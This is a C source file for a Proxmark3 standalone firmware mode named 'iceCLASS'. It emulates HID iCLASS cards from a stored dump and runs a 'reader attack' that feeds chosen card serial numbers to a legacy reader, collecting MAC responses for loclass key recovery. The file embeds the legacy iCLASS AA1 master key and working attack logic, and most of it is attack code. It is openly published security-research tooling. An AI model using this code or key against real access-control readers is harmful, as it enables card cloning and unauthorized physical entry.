//-----------------------------------------------------------------------------
// Christian Herrmann, 2020
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// main code for hf_iceclass by Iceman
//-----------------------------------------------------------------------------
#include "standalone.h" // standalone definitions
#include "proxmark3_arm.h"
#include "appmain.h"
#include "BigBuf.h"
#include "fpgaloader.h"
#include "util.h"
#include "dbprint.h"
#include "spiffs.h"
#include "iclass.h"
#include "optimized_cipher.h"

#define NUM_CSNS                    9
#define MAC_RESPONSES_SIZE          (16 * NUM_CSNS)
#define HF_ICLASS_FULLSIM_ORG_BIN   "iceclass-orig.bin"
#define HF_ICLASS_FULLSIM_POST_BIN  "iceclass-modified.bin"
#define HF_ICLASS_FULLSIM_POST_EML  "iceclass-modified-lasttag.bin.eml"
#define HF_ICLASS_ATTACK_BIN        "iceclass_mac_attack.bin"

static uint8_t legacy_aa1_key[] = {0xAE, 0xA6, 0x84, 0xA6, 0xDA, 0xB2, 0x32, 0x78};

static uint8_t csns[8 * NUM_CSNS] = {
    0x01, 0x0A, 0x0F, 0xFF, 0xF7, 0xFF, 0x12, 0xE0,
    0x0C, 0x06, 0x0C, 0xFE, 0xF7, 0xFF, 0x12, 0xE0,
    0x10, 0x97, 0x83, 0x7B, 0xF7, 0xFF, 0x12, 0xE0,
    0x13, 0x97, 0x82, 0x7A, 0xF7, 0xFF, 0x12, 0xE0,
    0x07, 0x0E, 0x0D, 0xF9, 0xF7, 0xFF, 0x12, 0xE0,
    0x14, 0x96, 0x84, 0x76, 0xF7, 0xFF, 0x12, 0xE0,
    0x17, 0x96, 0x85, 0x71, 0xF7, 0xFF, 0x12, 0xE0,
    0xCE, 0xC5, 0x0F, 0x77, 0xF7, 0xFF, 0x12, 0xE0,
    0xD2, 0x5A, 0x82, 0xF8, 0xF7, 0xFF, 0x12, 0xE0
    //0x04, 0x08, 0x9F, 0x78, 0x6E, 0xFF, 0x12, 0xE0
};

static void DownloadLogInstructions(uint8_t t) {
    Dbprintf("");
    switch (t) { 
        case ICLASS_SIM_MODE_FULL: {
            Dbprintf("The emulator memory was saved to flash. Try the following from flash and display it");
            Dbprintf("1. " _YELLOW_("mem spiffs dump o "HF_ICLASS_FULLSIM_POST_BIN" f "HF_ICLASS_FULLSIM_POST_BIN" e"));
            Dbprintf("2. " _YELLOW_("exit proxmark3 client"));
            Dbprintf("3. " _YELLOW_("cat "HF_ICLASS_FULLSIM_POST_EML));
            break;
        } 
        case ICLASS_SIM_MODE_READER_ATTACK: {
            Dbprintf("The emulator memory was saved to flash. Try the following from flash and display it");
            Dbprintf("1. " _YELLOW_("mem spiffs dump o "HF_ICLASS_FULLSIM_POST_BIN" f "HF_ICLASS_FULLSIM_POST_BIN" e"));
            Dbprintf("2. " _YELLOW_("hf iclass loclass f "HF_ICLASS_ATTACK_BIN));
            break;
        }
    }
}

void ModInfo(void) {
    DbpString("  HF iCLASS mode -  aka iceCLASS (iceman)");
}

void RunMod(void) {

    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
    BigBuf_Clear();

    StandAloneMode();
    Dbprintf(_YELLOW_("HF iCLASS mode a.k.a iceCLASS started"));

    uint8_t simtype = ICLASS_SIM_MODE_FULL;

    for (;;) {
        WDT_HIT();

        // exit from RunMod, send a usbcommand.
        if (data_available()) break;

        // Was our button held down or pressed?
        int button_pressed = BUTTON_HELD(1000);
        if (button_pressed != BUTTON_NO_CLICK) {
            break;
        }
                
        switch (simtype) {
            case ICLASS_SIM_MODE_FULL: {

                Dbprintf("enter full simulation mode");
                
                rdv40_spiffs_lazy_mount();
                // Look for a dump file in FLASH MEM.
                if (exists_in_spiffs(HF_ICLASS_FULLSIM_ORG_BIN) == false) {
                    Dbprintf("error, '" _YELLOW_(HF_ICLASS_FULLSIM_ORG_BIN) "' file missing");
                    Dbprintf("changing to reader attack mode instead");
                    simtype = ICLASS_SIM_MODE_READER_ATTACK;                    
                    break;
                }
              
                SpinOff(0);
                uint8_t *emul = BigBuf_get_EM_addr();
                uint32_t fsize = size_in_spiffs(HF_ICLASS_FULLSIM_ORG_BIN);
                int res = rdv40_spiffs_read_as_filetype(HF_ICLASS_FULLSIM_ORG_BIN, emul, fsize, RDV40_SPIFFS_SAFETY_SAFE);
                rdv40_spiffs_lazy_unmount();
                Dbprintf("Found `" _YELLOW_(HF_ICLASS_FULLSIM_ORG_BIN) "` , loaded %u bytes to emulator memory", fsize);

                if ( memcmp(emul + (3 * 8), "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF", 8) == 0) {
                    // create diversified key if not in dump.
                    uint8_t ccnr[12] = {0};
                    memcpy(ccnr, emul + (2 * 8), 8);                   
                    bool use_elite = false;
                    
                    iclass_calc_div_key(emul, legacy_aa1_key, emul + (3 * 8), use_elite);
                    
                    Dbhexdump(8, emul + (3 * 8), false);
                }

                iclass_simulate(ICLASS_SIM_MODE_FULL, 0 , false, NULL, NULL, NULL);
                
                LED_B_ON();
                rdv40_spiffs_lazy_mount();
                res = rdv40_spiffs_write(HF_ICLASS_FULLSIM_POST_BIN, emul, fsize, RDV40_SPIFFS_SAFETY_SAFE);
                rdv40_spiffs_lazy_unmount();
                LED_B_OFF();
                if (res != 0) {
                    Dbprintf("error writing '"HF_ICLASS_FULLSIM_POST_BIN"' to flash ( %d )", res);
                }
                DownloadLogInstructions(simtype);
                simtype = 0;
                break;
            }
            case ICLASS_SIM_MODE_READER_ATTACK: {

                Dbprintf("enter reader attack mode");
                uint16_t mac_response_len = 0;
                uint8_t mac_responses[MAC_RESPONSES_SIZE] = {0};

                iclass_simulate(ICLASS_SIM_MODE_READER_ATTACK, NUM_CSNS, false, csns, mac_responses, &mac_response_len);

                if (mac_response_len > 0) {

                    LED_B_ON();
                    rdv40_spiffs_lazy_mount();
                    int res = rdv40_spiffs_write(HF_ICLASS_ATTACK_BIN, mac_responses, mac_response_len, RDV40_SPIFFS_SAFETY_SAFE);
                    rdv40_spiffs_lazy_unmount();
                    LED_B_OFF();
                    if (res != 0) {
                        Dbprintf("error writing '"HF_ICLASS_ATTACK_BIN"' to flash ( %d )", res);
                    }
                }
                DownloadLogInstructions(simtype);
                simtype = 0;
                break;
            }
        } // switch
    } // for loop


    LEDsoff();
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
}
